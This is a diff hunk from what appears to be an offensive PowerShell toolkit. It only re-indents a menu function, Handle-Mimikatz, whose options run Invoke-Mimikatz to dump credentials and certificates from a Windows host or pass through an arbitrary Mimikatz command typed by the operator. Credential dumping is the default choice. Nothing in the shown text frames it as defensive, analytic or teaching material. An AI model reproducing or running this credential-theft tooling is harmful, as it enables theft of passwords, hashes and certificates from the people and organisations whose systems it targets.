@@ -102,22 +102,22 @@ function Handle-Mimikatz {
    switch($menuMcmd)
    {
         1 {
-                            Invoke-Mimikatz -DumpCreds
+		Invoke-Mimikatz -DumpCreds
           }
-		2 { 
-                            Invoke-Mimikatz -DumpCerts
+	2 {
+		Invoke-Mimikatz -DumpCerts
           }
-		3 {
-                            $command = Read-Host -Prompt '(Invoke-Mimikatz) command'
-                           if($command -ne "")
-                           {
-                                $command = $command.replace("|","")
-                                $command = $command.replace("""","")
-                                Invoke-Mimikatz -Command "$command"
-                           } 
+	3 {
+		$command = Read-Host -Prompt '(Invoke-Mimikatz) command'
+		if($command -ne "")
+		{
+			$command = $command.replace("|","")
+			$command = $command.replace("""","")
+			Invoke-Mimikatz -Command "$command"
+		} 
           }
   default {
-                            Invoke-Mimikatz -DumpCreds
+                Invoke-Mimikatz -DumpCreds
           }
    }   
 }
